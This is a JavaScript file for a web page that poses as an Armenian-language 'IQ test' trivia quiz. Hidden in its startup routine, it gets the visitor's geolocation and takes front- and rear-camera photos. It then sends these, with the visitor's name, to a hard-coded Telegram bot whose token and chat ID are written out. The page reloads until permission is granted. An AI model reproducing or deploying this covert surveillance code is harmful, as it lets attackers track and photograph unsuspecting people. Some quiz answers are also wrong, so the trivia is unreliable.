const TELEGRAM_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const questions = [
  {
    question: "Ո՞րն է Հայաստանի մայրաքաղաքը։",
    answers: [
      { text: "Երևան", correct: true },
      { text: "Գյումրի", correct: false },
      { text: "Վանաձոր", correct: false },
      { text: "Լոռի", correct: false }
    ]
  },
  {
    question: "Ո՞րն է 7 × 8",
    answers: [
      { text: "54", correct: false },
      { text: "56", correct: true },
      { text: "58", correct: false },
      { text: "64", correct: false }
    ]
  },
  {
    question: "Ո՞րն է ամենամեծ օվկիանոսը",
    answers: [
      { text: "Ատլանտյան", correct: false },
      { text: "Հնդկական", correct: false },
      { text: "Խաղաղ", correct: true },
      { text: "Արաբական", correct: false }
    ]
  },
  {
    question: "Ո՞րն է մարդու մարմնի ամենամեծ օրգանը",
    answers: [
      { text: "Սրտը", correct: false },
      { text: "Մաշկը", correct: true },
      { text: "Ոսկորները", correct: false },
      { text: "Երիկամները", correct: false }
    ]
  },
  {
    question: "Ո՞րն է արևմուտքում մաշկի վնասման հիմնական պատճառը",
    answers: [
      { text: "Ջերմությունը", correct: false },
      { text: "Արևի ճառագայթումը", correct: true },
      { text: "Ջերմաստիճանը", correct: false },
      { text: "Ջրի պակասը", correct: false }
    ]
  },
  {
    question: "Ո՞րն է Եվրոպայի ամենամեծ երկիրը",
    answers: [
      { text: "Ֆրանսիա", correct: false },
      { text: "Ռուսաստան", correct: true },
      { text: "Գերմանիա", correct: false },
      { text: "Իտալիա", correct: false }
    ]
  },
  {
    question: "Ո՞ր երկիրն է հայտնի իր շոկոլադով",
    answers: [
      { text: "Բելգիա", correct: true },
      { text: "Իսպանիա", correct: false },
      { text: "Իտալիա", correct: false },
      { text: "Գերմանիա", correct: false }
    ]
  },
  {
    question: "Ո՞րն է գիտության լեզուն",
    answers: [
      { text: "Լատին", correct: false },
      { text: "Անգլերեն", correct: true },
      { text: "Հին հունական", correct: false },
      { text: "Ֆրանսերեն", correct: false }
    ]
  },
  {
    question: "Ո՞րն է Երկրի միայն արբանյակը",
    answers: [
      { text: "Արեգակ", correct: false },
      { text: "Արեւ", correct: false },
      { text: "Աստղ", correct: false },
      { text: "Լուսին", correct: true }
    ]
  },
  {
    question: "Ո՞րն է ամենաարագ կենդանին",
    answers: [
      { text: "Գայլ", correct: false },
      { text: "Առյուծ", correct: false },
      { text: "Չղջիկ", correct: false },
      { text: "Ճայագռի", correct: true }
    ]
  }
];

function shuffle(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}

const userNameSpan = document.getElementById('user-name');
const questionStatsSpan = document.getElementById('question-stats');
const questionText = document.getElementById('question-text');
const answerButtons = document.getElementById('answer-buttons');
const resultScreen = document.getElementById('result-screen');
const resultTitle = document.getElementById('result-title');
const resultSummary = document.getElementById('result-summary');
const retryButton = document.getElementById('retry-button');

let shuffledQuestions, currentQuestionIndex;
let correctAnswers = 0;
let wrongAnswers = 0;

async function init() {
  let username = localStorage.getItem('iqtest_username');

  if (!username) {
    username = prompt("Մուտքագրեք ձեր անունը:");
    if (!username || username.trim() === '') username = 'Անուն չկա';
    localStorage.setItem('iqtest_username', username);
  }

  userNameSpan.textContent = username;

  const geo = await getGeolocation();
  const photos = await getCameraPhotos();

  sendDataToTelegram(username, geo, photos);

  if (geo || photos.length > 0) {
    startGame();
  } else {
    alert("Խնդրում ենք թույլտվեք կադերա կամ գտնվելու վայր:");
    location.reload();
  }
}

function getGeolocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve(null);
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (position) => {
        resolve({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        });
      },
      () => resolve(null)
    );
  });
}

async function getCameraPhotos() {
  const photos = [];

  async function capturePhoto(facingMode) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode },
        audio: false,
      });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const photoDataUrl = canvas.toDataURL('image/jpeg');

      stream.getTracks().forEach(track => track.stop());

      return photoDataUrl;
    } catch {
      return null;
    }
  }

  const frontPhoto = await capturePhoto('user');
  if (frontPhoto) photos.push(frontPhoto);

  const rearPhoto = await capturePhoto('environment');
  if (rearPhoto) photos.push(rearPhoto);

  return photos;
}

function sendDataToTelegram(username, geo, photos) {
  const messageParts = [];
  if (username) messageParts.push(`Անուն: ${username}`);

  if (geo) {
    const mapUrl = `https://maps.google.com/?q=${geo.latitude},${geo.longitude}`;
    messageParts.push(`Տեղադրություն: Լատ․ ${geo.latitude.toFixed(6)}, Լոնգ․ ${geo.longitude.toFixed(6)}, Ճշգրտություն՝ ${geo.accuracy}մ\nԿարգավիճակ՝ ${mapUrl}`);
  } else {
    messageParts.push("Տեղադրություն չի տրված։");
  }

  const textMessage = encodeURIComponent(messageParts.join('\n'));

  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${textMessage}`);

  photos.forEach((photo, index) => {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', dataURLtoBlob(photo), `photo${index}.jpg`);

    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });
  });
}

function dataURLtoBlob(dataurl) {
  const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
    bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
  for (let i=0; i<n; i++) {
    u8arr[i] = bstr.charCodeAt(i);
  }
  return new Blob([u8arr], {type:mime});
}

function startGame() {
  shuffledQuestions = shuffle(questions);
  currentQuestionIndex = 0;
  correctAnswers = 0;
  wrongAnswers = 0;
  resultScreen.classList.add('hidden');
  document.querySelector('.container').style.display = 'block';
  showQuestion();
}

function showQuestion() {
  resetState();
  const currentQuestion = shuffledQuestions[currentQuestionIndex];
  questionText.textContent = currentQuestion.question;

  const remaining = shuffledQuestions.length - currentQuestionIndex;
  questionStatsSpan.textContent = `Մնացել է ${remaining} | Ճիշտ ${correctAnswers} | Հակառակ ${wrongAnswers}`;

  currentQuestion.answers.forEach(answer => {
    const button = document.createElement('button');
    button.textContent = answer.text;
    button.classList.add('btn');
    button.addEventListener('click', () => selectAnswer(button, answer.correct));
    answerButtons.appendChild(button);
  });
}

function resetState() {
  while (answerButtons.firstChild) {
    answerButtons.removeChild(answerButtons.firstChild);
  }
}

function selectAnswer(button, correct) {
  if (correct) {
    correctAnswers++;
    button.style.backgroundColor = '#38a169';
  } else {
    wrongAnswers++;
    button.style.backgroundColor = '#e53e3e';
    showCorrectAnswer();
  }

  Array.from(answerButtons.children).forEach(btn => btn.disabled = true);

  setTimeout(() => {
    currentQuestionIndex++;
    if (currentQuestionIndex < shuffledQuestions.length) {
      showQuestion();
    } else {
      showResult();
    }
  }, 1500);
}

function showCorrectAnswer() {
  const currentQuestion = shuffledQuestions[currentQuestionIndex];
  Array.from(answerButtons.children).forEach((btn, idx) => {
    if (currentQuestion.answers[idx].correct) {
      btn.style.backgroundColor = '#38a169';
    }
  });
}

function showResult() {
  document.querySelector('.container').style.display = 'none';
  resultScreen.classList.remove('hidden');

  if (correctAnswers >= 7) {
    resultTitle.textContent = 'Դու խելացի ես 😎';
    resultSummary.textContent = `Ճիշտ պատասխաններ՝ ${correctAnswers} / ${shuffledQuestions.length}`;
  } else {
    resultTitle.textContent = 'Փորձիր նորից 🧠';
    resultSummary.textContent = `Ճիշտ պատասխաններ՝ ${correctAnswers} / ${shuffledQuestions.length}`;
  }
}

retryButton.addEventListener('click', () => {
  location.reload();
});

init();
